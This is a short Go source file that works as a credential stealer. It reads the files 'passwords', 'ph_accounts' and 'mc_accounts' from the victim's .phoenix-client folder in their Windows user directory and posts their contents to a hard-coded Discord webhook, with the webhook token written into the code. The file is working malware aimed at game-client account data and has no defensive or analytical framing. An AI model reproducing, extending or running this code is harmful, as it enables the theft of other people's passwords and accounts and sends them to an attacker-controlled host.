package grab

import (
	"fmt"
	"io/ioutil"
	"log"
	"path/filepath"

	users "info.com/project/pkg/info"
	wclinet "info.com/project/pkg/wclinet"
)

func Grab() {
	weburl := "https://discord.com/api/webhooks/1230470692525576243/M4_AWW3M-zk1Umv4gqNFhbI6lnXKjD1u3xXrPgDfYdeeLJdjt75ASqGtd2bJ9ODdnaAx"

	filesToRead := []string{"passwords", "ph_accounts", "mc_accounts"}

	uinfo, err := users.GetUsername()
	if err != nil {
		fmt.Println("[+] Faild")
	}
	dir := `C:\Users\` + uinfo + `\.phoenix-client`

	if err != nil {
		fmt.Println("[-] Direcotry not found")
	}

	for _, fileName := range filesToRead {
		filePath := filepath.Join(dir, fileName)
		content, err := ioutil.ReadFile(filePath)
		if err != nil {
			log.Printf("Failed to read file %s: %v\n", fileName, err)
			continue
		}
		wclinet.SendMessage(weburl, string(content))
	}
}
